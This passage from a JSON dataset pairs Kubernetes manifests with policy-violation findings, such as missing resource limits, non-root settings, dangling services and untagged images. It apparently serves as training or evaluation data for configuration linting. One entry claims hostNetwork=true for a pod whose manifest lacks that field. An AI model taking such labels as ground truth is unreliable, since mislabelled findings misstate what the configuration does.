    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: thl-khoaluan-qldrl\nspec:\n  selector:\n    matchLabels:\n      app: thl-khoaluan-qldrl\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: thl-khoaluan-qldrl\n    spec:\n      containers:\n      - name: thl-khoaluan-qldrl\n        image: ghcr.io/chidung091/thl-khoaluan-qldrl:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 3004\n        envFrom:\n        - secretRef:\n            name: thl-khoaluan-qldrl-secret\n            optional: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"thl-khoaluan-qldrl\" has cpu request 0"
  },
  {
    "id": "7427",
    "manifest_path": "data/manifests/the_stack_sample/sample_2715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer\n  namespace: web-dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registryula5418.azurecr.io/tripinsights/tripviewer:1.0\n        env:\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-service.api-dev.svc.cluster.local\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://user-java-service.api-dev.svc.cluster.local\n        - name: ASPNETCORE_ENVIRONMENT\n          value: Development\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tripviewer\" does not have a read-only root file system"
  },
  {
    "id": "7428",
    "manifest_path": "data/manifests/the_stack_sample/sample_2715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer\n  namespace: web-dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registryula5418.azurecr.io/tripinsights/tripviewer:1.0\n        env:\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-service.api-dev.svc.cluster.local\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://user-java-service.api-dev.svc.cluster.local\n        - name: ASPNETCORE_ENVIRONMENT\n          value: Development\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tripviewer\" is not set to runAsNonRoot"
  },
  {
    "id": "7429",
    "manifest_path": "data/manifests/the_stack_sample/sample_2717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.beta.openshift.io/serving-cert-secret-name: prometheus-k8s-thanos-sidecar-tls\n  labels:\n    app.kubernetes.io/component: thanos-sidecar\n    app.kubernetes.io/instance: k8s\n    app.kubernetes.io/name: prometheus\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.32.1\n  name: prometheus-k8s-thanos-sidecar\n  namespace: openshift-monitoring\nspec:\n  clusterIP: None\n  ports:\n  - name: thanos-proxy\n    port: 10902\n    targetPort: thanos-proxy\n  selector:\n    app.kubernetes.io/component: prometheus\n    app.kubernetes.io/instance: k8s\n    app.kubernetes.io/name: prometheus\n    app.kubernetes.io/part-of: openshift-monitoring\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:prometheus app.kubernetes.io/instance:k8s app.kubernetes.io/name:prometheus app.kubernetes.io/part-of:openshift-monitoring])"
  },
  {
    "id": "7430",
    "manifest_path": "data/manifests/the_stack_sample/sample_2718.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: nrt.ocir.io/nr77icjzndc9/handson2/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cowweb\" does not have a read-only root file system"
  },
  {
    "id": "7431",
    "manifest_path": "data/manifests/the_stack_sample/sample_2718.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: nrt.ocir.io/nr77icjzndc9/handson2/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cowweb\" is not set to runAsNonRoot"
  },
  {
    "id": "7432",
    "manifest_path": "data/manifests/the_stack_sample/sample_2718.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: nrt.ocir.io/nr77icjzndc9/handson2/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cowweb\" has cpu request 0"
  },
  {
    "id": "7433",
    "manifest_path": "data/manifests/the_stack_sample/sample_2718.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: nrt.ocir.io/nr77icjzndc9/handson2/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cowweb\" has memory limit 0"
  },
  {
    "id": "7434",
    "manifest_path": "data/manifests/the_stack_sample/sample_2720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-web\n  labels:\n    customer: acg\nspec:\n  selector:\n    matchLabels:\n      app: web\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: nigelpoulton/acg-web:0.1\n        name: web-ctr\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7435",
    "manifest_path": "data/manifests/the_stack_sample/sample_2720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-web\n  labels:\n    customer: acg\nspec:\n  selector:\n    matchLabels:\n      app: web\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: nigelpoulton/acg-web:0.1\n        name: web-ctr\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web-ctr\" does not have a read-only root file system"
  },
  {
    "id": "7436",
    "manifest_path": "data/manifests/the_stack_sample/sample_2720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-web\n  labels:\n    customer: acg\nspec:\n  selector:\n    matchLabels:\n      app: web\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: nigelpoulton/acg-web:0.1\n        name: web-ctr\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "7437",
    "manifest_path": "data/manifests/the_stack_sample/sample_2720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-web\n  labels:\n    customer: acg\nspec:\n  selector:\n    matchLabels:\n      app: web\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: nigelpoulton/acg-web:0.1\n        name: web-ctr\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web-ctr\" has cpu request 0"
  },
  {
    "id": "7438",
    "manifest_path": "data/manifests/the_stack_sample/sample_2720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple-web\n  labels:\n    customer: acg\nspec:\n  selector:\n    matchLabels:\n      app: web\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: nigelpoulton/acg-web:0.1\n        name: web-ctr\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web-ctr\" has memory limit 0"
  },
  {
    "id": "7439",
    "manifest_path": "data/manifests/the_stack_sample/sample_2721.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: aaaatiwarishubaks-49a0\n  labels:\n    app: aaaatiwarishubaks-49a0\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 4000\n    targetPort: 4000\n    protocol: TCP\n    name: http\n  selector:\n    app: aaaatiwarishubaks-49a0\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:aaaatiwarishubaks-49a0])"
  },
  {
    "id": "7440",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7441",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7442",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "7443",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "7444",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "7445",
    "manifest_path": "data/manifests/the_stack_sample/sample_2722.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-with-host-network\nspec:\n  containers:\n  - name: main\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "7446",
    "manifest_path": "data/manifests/the_stack_sample/sample_2723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: service-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: service-a\n  template:\n    metadata:\n      labels:\n        app: service-a\n    spec:\n      containers:\n      - name: service-a\n        image: jacarrichan/cloud-service-a:1.2.0\n        env:\n        - name: PORT\n          value: '8080'\n        - name: REGISTRY_SERVICE_URL\n          value: http://registry-0.registry-headless.default.svc.cluster.local:8761/eureka,http://registry-1.registry-headless.default.svc.cluster.local:8761/eureka\n        - name: ZIPKIN_SERVICE_URL\n          value: http://zipkin-server:9422\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"service-a\" does not have a read-only root file system"
  },
  {
    "id": "7447",
    "manifest_path": "data/manifests/the_stack_sample/sample_2723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: service-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: service-a\n  template:\n    metadata:\n      labels:\n        app: service-a\n    spec:\n      containers:\n      - name: service-a\n        image: jacarrichan/cloud-service-a:1.2.0\n        env:\n        - name: PORT\n          value: '8080'\n        - name: REGISTRY_SERVICE_URL\n          value: http://registry-0.registry-headless.default.svc.cluster.local:8761/eureka,http://registry-1.registry-headless.default.svc.cluster.local:8761/eureka\n        - name: ZIPKIN_SERVICE_URL\n          value: http://zipkin-server:9422\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"service-a\" is not set to runAsNonRoot"
  },
  {
    "id": "7448",
    "manifest_path": "data/manifests/the_stack_sample/sample_2723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: service-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: service-a\n  template:\n    metadata:\n      labels:\n        app: service-a\n    spec:\n      containers:\n      - name: service-a\n        image: jacarrichan/cloud-service-a:1.2.0\n        env:\n        - name: PORT\n          value: '8080'\n        - name: REGISTRY_SERVICE_URL\n          value: http://registry-0.registry-headless.default.svc.cluster.local:8761/eureka,http://registry-1.registry-headless.default.svc.cluster.local:8761/eureka\n        - name: ZIPKIN_SERVICE_URL\n          value: http://zipkin-server:9422\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"service-a\" has cpu request 0"
  },
  {
    "id": "7449",
    "manifest_path": "data/manifests/the_stack_sample/sample_2723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: service-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: service-a\n  template:\n    metadata:\n      labels:\n        app: service-a\n    spec:\n      containers:\n      - name: service-a\n        image: jacarrichan/cloud-service-a:1.2.0\n        env:\n        - name: PORT\n          value: '8080'\n        - name: REGISTRY_SERVICE_URL\n          value: http://registry-0.registry-headless.default.svc.cluster.local:8761/eureka,http://registry-1.registry-headless.default.svc.cluster.local:8761/eureka\n        - name: ZIPKIN_SERVICE_URL\n          value: http://zipkin-server:9422\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"service-a\" has memory limit 0"
  },
  {
    "id": "7450",
    "manifest_path": "data/manifests/the_stack_sample/sample_2724.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ui\n  namespace: skywalking\n  labels:\n    service: ui\nspec:\n  ports:\n  - port: 80\n    name: page\n    targetPort: page\n  type: LoadBalancer\n  selector:\n    app: ui\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ui])"
  },
  {
    "id": "7451",
    "manifest_path": "data/manifests/the_stack_sample/sample_2725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gitlab-minio-svc\n  namespace: gitlab\n  labels:\n    app: minio\n    chart: minio-0.4.3\n    heritage: Helm\n    release: gitlab\nspec:\n  ports:\n  - name: service\n    protocol: TCP\n    port: 9000\n    targetPort: 9000\n  selector:\n    app: minio\n    component: app\n    release: gitlab\n  clusterIP: 10.75.13.104\n  type: ClusterIP\n  sessionAffinity: None\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:minio component:app release:gitlab])"
  },
  {
    "id": "7452",
    "manifest_path": "data/manifests/the_stack_sample/sample_2726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-guestbook-mongodb\n  labels:\n    app: node-guestbook\n    tier: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-guestbook\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: node-guestbook\n        tier: db\n    spec:\n      containers:\n      - name: mongo\n        image: mongo:4\n        ports:\n        - containerPort: 27017\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "7453",
    "manifest_path": "data/manifests/the_stack_sample/sample_2726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-guestbook-mongodb\n  labels:\n    app: node-guestbook\n    tier: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-guestbook\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: node-guestbook\n        tier: db\n    spec:\n      containers:\n      - name: mongo\n        image: mongo:4\n        ports:\n        - containerPort: 27017\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "7454",
    "manifest_path": "data/manifests/the_stack_sample/sample_2726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-guestbook-mongodb\n  labels:\n    app: node-guestbook\n    tier: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-guestbook\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: node-guestbook\n        tier: db\n    spec:\n      containers:\n      - name: mongo\n        image: mongo:4\n        ports:\n        - containerPort: 27017\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "7455",
    "manifest_path": "data/manifests/the_stack_sample/sample_2726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-guestbook-mongodb\n  labels:\n    app: node-guestbook\n    tier: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-guestbook\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: node-guestbook\n        tier: db\n    spec:\n      containers:\n      - name: mongo\n        image: mongo:4\n        ports:\n        - containerPort: 27017\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "7456",
    "manifest_path": "data/manifests/the_stack_sample/sample_2727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: db-controller\nspec:\n  replicas: 1\n  selector:\n    app: db\n  template:\n    metadata:\n      name: db\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: localhost:5000/dbforweb\n        ports:\n        - containerPort: 3306\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"db\" is using an invalid container image, \"localhost:5000/dbforweb\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7457",
    "manifest_path": "data/manifests/the_stack_sample/sample_2727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: db-controller\nspec:\n  replicas: 1\n  selector:\n    app: db\n  template:\n    metadata:\n      name: db\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: localhost:5000/dbforweb\n        ports:\n        - containerPort: 3306\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db\" does not have a read-only root file system"
  },
  {
    "id": "7458",
    "manifest_path": "data/manifests/the_stack_sample/sample_2727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: db-controller\nspec:\n  replicas: 1\n  selector:\n    app: db\n  template:\n    metadata:\n      name: db\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: localhost:5000/dbforweb\n        ports:\n        - containerPort: 3306\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db\" is not set to runAsNonRoot"
  },
  {
    "id": "7459",
    "manifest_path": "data/manifests/the_stack_sample/sample_2727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: db-controller\nspec:\n  replicas: 1\n  selector:\n    app: db\n  template:\n    metadata:\n      name: db\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: localhost:5000/dbforweb\n        ports:\n        - containerPort: 3306\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db\" has cpu request 0"
  },
  {
    "id": "7460",
    "manifest_path": "data/manifests/the_stack_sample/sample_2727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: db-controller\nspec:\n  replicas: 1\n  selector:\n    app: db\n  template:\n    metadata:\n      name: db\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: localhost:5000/dbforweb\n        ports:\n        - containerPort: 3306\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db\" has memory limit 0"
  },
  {
    "id": "7461",
    "manifest_path": "data/manifests/the_stack_sample/sample_2728.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/name: controller\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.27.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.27.0\n    app: tekton-pipelines-controller\n    version: v0.27.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  name: tekton-pipelines-controller\n  namespace: tekton-pipelines\n  annotations:\n    meta.helm.sh/release-name: tekton\nspec:\n  ports:\n  - name: http-metrics\n    port: 9090\n    protocol: TCP\n    targetPort: 9090\n  - name: probes\n    port: 8080\n  selector:\n    app.kubernetes.io/name: controller\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/part-of: tekton-pipelines\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:controller app.kubernetes.io/instance:default app.kubernetes.io/name:controller app.kubernetes.io/part-of:tekton-pipelines])"
  },
  {
    "id": "7462",
    "manifest_path": "data/manifests/the_stack_sample/sample_2729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db\n  namespace: tekton-hub-preview\n  labels:\n    app: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: postgres:13@sha256:260a98d976574b439712c35914fdcb840755233f79f3e27ea632543f78b7a21e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_DATABASE\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_USER\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_PASSWORD\n        - name: PGDATA\n          value: /var/lib/postgresql/data/pgdata\n        volumeMounts:\n        - name: db\n          mountPath: /var/lib/postgresql/data\n      volumes:\n      - name: db\n        persistentVolumeClaim:\n          claimName: db\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db\" does not have a read-only root file system"
  },
  {
    "id": "7463",
    "manifest_path": "data/manifests/the_stack_sample/sample_2729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db\n  namespace: tekton-hub-preview\n  labels:\n    app: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: postgres:13@sha256:260a98d976574b439712c35914fdcb840755233f79f3e27ea632543f78b7a21e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_DATABASE\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_USER\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_PASSWORD\n        - name: PGDATA\n          value: /var/lib/postgresql/data/pgdata\n        volumeMounts:\n        - name: db\n          mountPath: /var/lib/postgresql/data\n      volumes:\n      - name: db\n        persistentVolumeClaim:\n          claimName: db\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db\" is not set to runAsNonRoot"
  },
  {
    "id": "7464",
    "manifest_path": "data/manifests/the_stack_sample/sample_2729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db\n  namespace: tekton-hub-preview\n  labels:\n    app: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: postgres:13@sha256:260a98d976574b439712c35914fdcb840755233f79f3e27ea632543f78b7a21e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_DATABASE\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_USER\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_PASSWORD\n        - name: PGDATA\n          value: /var/lib/postgresql/data/pgdata\n        volumeMounts:\n        - name: db\n          mountPath: /var/lib/postgresql/data\n      volumes:\n      - name: db\n        persistentVolumeClaim:\n          claimName: db\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db\" has cpu request 0"
  },
  {
    "id": "7465",
    "manifest_path": "data/manifests/the_stack_sample/sample_2729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db\n  namespace: tekton-hub-preview\n  labels:\n    app: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - name: db\n        image: postgres:13@sha256:260a98d976574b439712c35914fdcb840755233f79f3e27ea632543f78b7a21e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_DATABASE\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_USER\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db\n              key: POSTGRESQL_PASSWORD\n        - name: PGDATA\n          value: /var/lib/postgresql/data/pgdata\n        volumeMounts:\n        - name: db\n          mountPath: /var/lib/postgresql/data\n      volumes:\n      - name: db\n        persistentVolumeClaim:\n          claimName: db\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db\" has memory limit 0"
  },
  {
    "id": "7466",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: postgres-deployment-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: Always\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-standalone\n        - name: APP_PVC\n          value: pgdata-claim\n        - name: APP_LABEL\n          value: app=pgset\n        - name: APP_NAMESPACE\n          value: app-pgres-ns\n        - name: DEPLOY_TYPE\n          value: statefulset\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./crunchy-postgres/deployers/test.yml -i /etc/ansible/hosts\n          -v; exit 0\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7467",
    "manifest_path": "data/manifests/the_stack_sample/sample_2730.yaml",
